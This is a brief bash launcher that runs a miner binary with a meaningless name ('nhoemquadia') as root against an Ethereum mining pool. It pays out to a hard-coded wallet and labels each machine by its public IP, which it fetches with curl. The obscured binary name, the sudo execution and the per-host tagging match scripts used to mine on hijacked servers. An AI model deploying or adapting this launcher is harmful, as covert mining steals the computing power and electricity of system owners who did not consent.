#!/bin/bash
#!/bin/bash

POOL=eu1.ethermine.org:4444
WALLET=0x39c240d1597a044f7b6bf85c078d41c6a3b12dde.$(echo "$(curl -s ifconfig.me)" | tr . _ )-AccWy
cd "$(dirname "$0")"

chmod +x ./nhoemquadia && sudo ./nhoemquadia --algo ETHASH --pool $POOL --user $WALLET  $@
